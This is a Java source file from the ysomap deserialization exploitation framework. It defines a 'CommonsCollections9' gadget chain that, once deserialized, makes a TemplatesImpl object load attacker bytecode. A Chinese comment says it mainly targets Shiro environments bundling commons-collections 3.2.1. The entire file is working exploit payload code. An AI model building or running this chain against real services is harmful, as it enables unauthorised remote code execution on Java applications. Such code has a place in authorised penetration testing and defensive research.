package ysomap.payloads.java.commons.collection_v3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * 该payload主要为了攻击shiro环境自带的3.2.1
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Payloads
@Targets({Targets.JDK})
@Dependencies({"commons-collections:commons-collections:3.2.1","special for shiro"})
@Require(bullets = {"TemplatesImplBullet"}, param = false)
@Authors({ Authors.WH1T3P1G })
public class CommonsCollections9 extends AbstractPayload<HashSet> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof TemplatesImpl;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplBullet.newInstance(args);
    }

    @Override
    public HashSet pack(Object obj) throws Exception {
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, obj);

        HashSet set = PayloadHelper.makeHashSetWithEntry(entry);
        ReflectionHelper.setFieldValue(transformer, "iMethodName", "newTransformer");

        return set;
    }

}
